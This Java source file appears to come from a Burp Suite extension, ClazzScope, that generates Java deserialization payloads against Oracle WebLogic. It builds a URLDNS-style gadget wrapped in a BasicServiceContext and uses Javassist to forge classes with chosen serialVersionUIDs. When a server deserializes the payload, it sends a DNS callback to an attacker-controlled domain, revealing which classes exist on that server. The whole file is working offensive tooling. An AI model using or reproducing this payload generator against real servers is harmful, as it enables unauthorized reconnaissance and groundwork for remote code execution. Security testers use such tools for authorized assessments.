package net.babyphd.clazzscope;

import burp.Analyzer;
import javassist.*;
import weblogic.rmi.provider.BasicServiceContext;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.nqzero.permit.Permit.setAccessible;

public class ClazzScope {

    public String callbackDomain;
    private ClassPool pool;

    public ClazzScope(String callback_domain) {
        this.callbackDomain = callback_domain;
        this.pool = new ClassPool(true);
    }

    public static Class getOrGenerateClass(String className, String svUID) {
        ClassPool classPool= ClassPool.getDefault();
        CtClass ctClass;
        try {
            ctClass = classPool.get(className);
            ctClass.defrost();
        } catch (NotFoundException e) {
            ctClass  = classPool.makeClass(className);
        }



        try {
            CtField ctSUID = ctClass.getDeclaredField("serialVersionUID");
            ctClass.removeField(ctSUID);
        }catch (NotFoundException e){}

        ctClass.setInterfaces(new CtClass[]{classPool.makeInterface("java.io.Serializable")});
        CtField field = null;
        try {
            field = CtField.make(
                    "private static final long serialVersionUID =  " + Long.parseLong(svUID) + "L;",
                    ctClass);
            ctClass.addField(field);
        } catch (CannotCompileException e) {
            e.printStackTrace();
        }
        try {
            Class clazz = ctClass.toClass(new JavassistClassLoader());
            return clazz;
        } catch (CannotCompileException err) {
            if (err.getCause() != null && err.getCause().getCause() instanceof SecurityException) {
                System.err.println("Error: Classname is in protected package. Most likely a typo: " + className);
            } else {
                err.printStackTrace();
            }
        }


        return null;
    }

    @SuppressWarnings("unchecked")
    public byte[] getObject(String className) {
        URLStreamHandler handler = new SilentURLStreamHandler();

        LinkedHashMap hm = new LinkedHashMap();
        URL u = null;

        String svUID = className.substring(className.lastIndexOf(".")+1);
        className = className.substring(0, className.length() - svUID.length()-1);

        try {
            u = new URL(null, "http://"  + svUID + "-d" + className.replaceAll("\\$","-dl-")  +  "." + callbackDomain, handler);
            //
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        String fakeClass = Analyzer.genString(className.length());
        Class clazz = getOrGenerateClass(fakeClass, svUID);
        if (clazz == null) {
            return null;
        }
        try {
            hm.put("test", clazz.newInstance());
        }
        catch (Exception e){
            e.printStackTrace();
        };
        hm.put(u, "test");
        try {
            Field field = URL.class.getDeclaredField("hashCode");
            setAccessible(field);

            field.set(u, -1);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        try {
            ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
            BasicServiceContext bsc = new BasicServiceContext(1, hm, false);
            out.writeObject(bsc);
        } catch (IOException e) {
            e.printStackTrace();
        }
        // Method for deserialization of object
//        byte[] byteObj = byteArrayOutputStream.toString().replaceAll(Pattern.quote(fakeClass), Matcher.quoteReplacement(clazz.getName())).getBytes();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        byte[] search = fakeClass.getBytes();
        byte[] replacement = className.getBytes();
        InputStream ris = new ReplacingInputStream(bis, search, replacement);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int b = 0;
        while (true) {
            try {
                if (!(-1 != (b = ris.read()))) break;
            } catch (IOException e) {
                e.printStackTrace();
            }
            bos.write(b);
        }

        return bos.toByteArray();
    }
    public static void main(String[] args) throws  Exception{
        Analyzer.getUniqueList(args);

    }
}
